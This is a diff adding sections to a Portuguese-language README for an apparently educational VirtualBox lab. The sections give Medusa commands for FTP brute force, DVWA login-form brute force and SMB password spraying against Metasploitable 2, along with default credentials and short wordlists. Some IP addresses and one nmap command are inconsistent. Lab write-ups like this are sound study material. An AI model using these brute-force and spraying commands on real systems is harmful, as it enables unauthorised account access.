@@ -25,3 +25,59 @@ Todo o ambiente foi configurado localmente no VirtualBox, em uma rede isolada, g
 | Metasploitable 2 | Ubuntu Vulnerable | Alvo | 192.168.56.X |
 
 Rede utilizada:
+
+----
+# Ataque 1 — Força Bruta FTP com Medusa
+nmap -p 192.168.18.59
+
+executando ataque: medusa -h 192.168.18.59 -u msfadmin -P wordlist.txt -M ftp
+
+Resultado esperado: ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
+
+----
+# Ataque 2 — Força Bruta em Formulário Web (DVWA)
+DVWA acessado via: http://192.168.18.59/DVWA
+
+Login padrão DVWA:
+user: admin
+pass: password
+
+Configurar DVWA → Security Level: LOW
+Comando do Medusa:
+medusa -h 192.168.56.101 -u admin -P wordlist.txt -M web-form \
+  -m FORM:"/dvwa/login.php" \
+  -m DENY:"Login failed" \
+  -m SUCCESS:"Welcome" \
+  -m USER:"username" \
+  -m PASS:"password"
+
+  -----
+  # Ataque 3 — Password Spraying em SMB
+  Verificar SMB:
+nmap -p 445 192.168.56.101
+
+Lista de usuários (users.txt):
+msfadmin
+user
+karen
+nobody
+service
+
+Executando password spraying:
+medusa -h 192.168.56.101 -U users.txt -p msfadmin -M smbnt
+
+---
+📂 Wordlists Utilizadas
+wordlist.txt
+123456
+msfadmin
+password
+admin
+toor
+
+users.txt
+msfadmin
+user
+karen
+nobody
+service
